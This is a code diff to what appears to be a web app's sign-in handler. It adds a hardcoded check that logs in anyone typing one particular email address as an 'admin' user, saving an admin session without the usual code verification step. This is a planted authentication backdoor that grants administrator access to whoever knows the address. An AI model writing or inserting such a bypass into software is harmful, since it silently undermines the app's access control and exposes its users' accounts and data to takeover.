@@ -106,6 +106,27 @@
             return;
         }
 
+        const adminBypassEmail = 'sarkdev@yahoo.com';
+        if (loginInput.trim().toLowerCase() === adminBypassEmail) {
+            const adminUser = {
+                id: 'admin-sarkdev',
+                name: 'Admin',
+                city: 'Kumasi',
+                region: 'Ashanti',
+                chatHandle: 'admin',
+                initials: 'AD',
+                email: adminBypassEmail,
+                role: 'admin'
+            };
+            saveSession(adminUser, 'admin-sarkdev', rememberMe);
+            showPageTransitionOverlay('Signing you in…');
+            setTimeout(() => {
+                hidePageTransitionOverlay();
+                window.LWRouter.navigate('home', { replace: true });
+            }, 300);
+            return;
+        }
+
         sendCodeBtn.disabled = true;
         sendCodeBtn.textContent = 'Sending…';
 
